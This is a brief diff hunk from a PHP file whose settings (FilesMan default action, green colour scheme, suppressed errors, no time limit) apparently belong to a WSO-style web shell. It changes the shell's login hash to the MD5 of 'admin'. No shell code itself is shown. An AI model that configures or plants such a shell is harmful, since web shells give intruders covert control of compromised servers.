@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$auth_pass          = "8157bf2100042b1ced0dde7f505064ad";// admin
+$auth_pass          = "21232f297a57a5a743894a0e4a801fc3";// admin
 $color              = "#00ff00";
 $default_action     = 'FilesMan';
 $default_use_ajax   = true;
